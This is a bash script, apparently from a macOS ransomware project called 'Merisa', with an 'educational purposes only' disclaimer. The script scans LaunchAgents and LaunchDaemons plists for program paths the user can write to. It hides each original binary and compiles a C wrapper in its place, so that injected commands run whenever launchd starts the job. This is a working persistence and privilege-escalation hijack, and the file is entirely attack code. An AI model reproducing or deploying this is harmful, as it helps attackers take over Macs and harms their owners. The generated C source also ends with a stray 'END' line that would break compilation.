#!/bin/bash
#By Shellbear - github.com/shellbear
#Notice : This project was made by ShellBear (github.com/shellbear)
#For educational purposes only, so don't use it on computer you don't own !
#I don't hold any responsibility for the bad use of this tool,
#Remember that attacking targets without prior consent is illegal and punished by law.


#    Welcome to Merisa
#     ╔╦╗╔═╗╦═╗╦╔═╗╔═╗
#     ║║║║╣ ╠╦╝║╚═╗╠═╣
#     ╩ ╩╚═╝╩╚═╩╚═╝╩ ╩
#The MacOS ransomware project

ls -1 ~/Library/LaunchAgents | while read line; do 
item=$(cat ~/Library/LaunchAgents/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
if [[ -w "$item" ]]; then 
	echo "$item is writable" 
	mv "$item" "$(dirname "$item")/.$(basename "$item")"
	cat <<EOM > "$item.c"
#include <stdio.h>
#include <stdlib.h>

int main(void){
system("command; open $(dirname "$item")/.$(basename "$item")");
}
END
EOM
gcc -o "$item" "$item.c"
rm "$item.c"
chmod +x "$item"
fi 
done

ls -1 /Library/LaunchDaemons | while read line; do 
item=$(cat /Library/LaunchDaemons/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
if [[ -w "$item" ]]; then 
	echo "$item is writable" 
	mv "$item" "$(dirname "$item")/.$(basename "$item")"
	cat <<EOM > "$item.c"
#include <stdio.h>
#include <stdlib.h>

int main(void){
system("command; open $(dirname "$item")/.$(basename "$item")");
}
END
EOM
gcc -o "$item" "$item.c"
rm "$item.c"
chmod +x "$item"
fi 
done

ls -1 /Library/LaunchAgents | while read line; do 
item=$(cat /Library/LaunchAgents/$line | grep -A 2 "<key>ProgramArguments</key>" | grep -Eo "<string>[^ ].*" | sed 's,</string>,,g' | sed 's,<string>,,g')
if [[ -w "$item" ]]; then 
	echo "$item is writable" 
	mv "$item" "$(dirname "$item")/.$(basename "$item")"
	cat <<EOM > "$item.c"
#include <stdio.h>
#include <stdlib.h>

int main(void){
system("command; open $(dirname "$item")/.$(basename "$item")");
}
END
EOM
gcc -o "$item" "$item.c"
rm "$item.c"
chmod +x "$item"
fi 
done
